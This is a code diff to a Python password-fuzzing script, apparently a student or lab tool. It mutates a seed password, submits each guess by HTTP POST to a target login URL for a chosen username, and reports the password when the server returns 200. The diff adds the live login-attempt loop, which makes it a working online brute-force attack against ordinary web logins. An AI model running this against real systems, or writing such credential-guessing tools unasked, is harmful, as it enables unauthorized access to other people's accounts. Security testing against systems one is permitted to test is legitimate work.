@@ -4,6 +4,10 @@ import sys
 import random
 import string
 import time
+import requests
+
+# password regex: ^[A-Za-z0-9!?]{6,11}$
+REGEX = "^[A-Za-z0-9!?]{6,11}$"
 
 """ Function manages the mutation loop and login attempts to the target URL"""
 """Input Flags: 0 - Simple (only uses seed for mutations)
@@ -14,13 +18,19 @@ def fuzz(seed, regex, max_attempts, max_time, url, username, fuzz_type):
     curr_attempt = 0
     past_mutation = seed
     while(True):
-        output = mutation_handler(seed, past_mutation, regex, type, curr_attempt)
+        output = mutation_handler(seed, past_mutation, regex, fuzz_type, curr_attempt)
         generated_pass = output[0]
         past_mutation = output[1]
         curr_attempt += 1
         # Submit Attempt
-
-
+        r = requests.post(url, data={"username": username, "password": generated_pass})
+        if(r.status_code == 404):
+            print("Error 404: URL not found")
+            exit(1)
+        print(r.status_code)
+        if r.status_code == 200:
+            print("{}{}".format("Success! Password is: ", generated_pass))
+            exit(0)
         print("{}{}".format("Attempt: ", curr_attempt))
         # If attempt fails, check if time runs out or if max attempts reached
         if(max_time != 0 and time.time()-start_time > max_time):
@@ -36,16 +46,15 @@ def fuzz(seed, regex, max_attempts, max_time, url, username, fuzz_type):
 
     This is called first from the fuzz() function. Depending on the fuzz type chosen, it will mutate differently"""
 def mutation_handler(seed, past_mutation, regex, type, curr_attempt):
-
     if type == 0: # Simple mutation chosen, seed used in all runs
         generated_pass = mutate(seed, regex)
     if type == 1: # Iterative mutation chosen, past_mutation used as seed for next run. Resets after every 100 attempts
-        if curr_attempt % 100 == 0:
+        if curr_attempt % 25 == 0:
             past_mutation = seed
         generated_pass = mutate(past_mutation, regex)
         past_mutation = generated_pass
     if type == 2: # Complex mutation chosen, 2 mutates per run. Resets after every 50 attempts
-        if curr_attempt % 50 == 0:
+        if curr_attempt % 10 == 0:
             past_mutation = seed
         generated_pass = mutate(past_mutation, regex)
         generated_pass = mutate(generated_pass, regex)
@@ -72,7 +81,7 @@ def mutate(seed, regex):
                 pwd[idx] = random.choice(string.punctuation)
 
         elif mutation_type == 'insert': # Inserts a random character at a random position
-            char = random.choice(string.ascii_letters + string.digits + string.punctuation)
+            char = random.choice(string.ascii_letters + string.digits + "!?")
             idx = random.randrange(len(pwd) + 1)
             pwd.insert(idx, char)
 
@@ -119,7 +128,7 @@ def parse_args():
                         help="Username to test")
     parser.add_argument('--seed', required=True, type=str, default="Password123!",
                         help="Seed password to mutate")
-    parser.add_argument('--regex', required=True, type=valid_regex,
+    parser.add_argument('--regex', type=valid_regex,
                         help="Regex pattern password must satisfy")
     parser.add_argument('--max-time', type=int, default=60,
                         help="Maximum execution time in seconds")
@@ -137,13 +146,13 @@ def parse_args():
         parser.error("max-attempts must be a positive integer")
     if args.fuzz_type < 0 or args.fuzz_type > 2:
         parser.error("Fuzz Type must be 0, 1, or 2")
-
+    if not re.fullmatch(REGEX, args.seed):
+        parser.error("Seed must full match regex: ^[A-Za-z0-9!?]{6,11}$")
     return args
 
 """ Main function to run the script """
 def main():
     args = parse_args()
-
     # Placeholder for the main logic of the script
     print("""
     Welcome to...
@@ -163,13 +172,13 @@ v-------------------------------------------------------------------------------
     print(f"URL: {args.url}")
     print(f"Username: {args.username}")
     print(f"Seed Password: {args.seed}")
-    print(f"Regex Pattern: {args.regex}")
+    print("{}{}".format("Regex Pattern: ", REGEX))
     print(f"Max Time: {args.max_time} seconds")
     print(f"Max Attempts: {args.max_attempts}")
     print(f"Fuzz Type: {args.fuzz_type}")
     input("\n\nPress enter when you are ready to begin fuzzing!")
 
-    fuzz(args.seed, args.regex, args.max_attempts, args.max_time, args.url, args.username, args.fuzz_type)
+    fuzz(args.seed, REGEX, args.max_attempts, args.max_time, args.url, args.username, args.fuzz_type)
 
 if __name__ == "__main__":
     main()
